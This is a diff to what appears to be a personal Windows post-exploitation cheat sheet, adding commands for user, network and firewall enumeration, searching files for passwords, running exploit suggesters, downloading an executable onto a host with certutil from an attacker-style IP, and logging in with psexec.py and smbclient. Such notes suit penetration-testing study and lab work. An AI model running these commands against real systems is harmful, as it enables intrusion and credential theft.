@@ -35,11 +35,65 @@ net users
 net user janith
 ```
 
+### Find whos on administrator group
+```
+net localgroup administrators
+```
+
+## Network enumeration
+
+###Find host ip
+```
+ipconfig
+ipconfig /all
+```
+
+## Searching for passwords
+
+### Search for passwords
+```
+findstr /si password *.txt
+```
+
+## AV and Firewall enumeration
+
+### Find all the services running
+```
+sc queryex type= service 
+```
+
+### Check firewall info
+```
+netsh advfirewall firewall dump
+netsh firewall show state
+```
+
 ### metersploit local exploit sugester
 ```
-use post/multi/recon/local_exploit_suggester
+run post/multi/recon/local_exploit_suggester
 ```
 run this script using the session 
+
+### Run windows exploit suggester using systeminfo
+```
+python windows-exploit-suggester.py --database 2020-10-12-mssb.xls --systeminfo sysinfo.txt
+```
+
+## Downloading files into windows host
+first go to c:/temp folder
+```
+certutil -urlcache -f http://10.10.14.32/temp.exe temp.exe
+```
+
+## Use credentials to login using psexec.py
+```
+python psexec.py USER:PASSWORD@DOMAIN
+```
+
+## connect to SMB using credentials
+```
+smbclient \\\\IP\\FOLDER -U USER
+```
 
 
 ## SAM file path
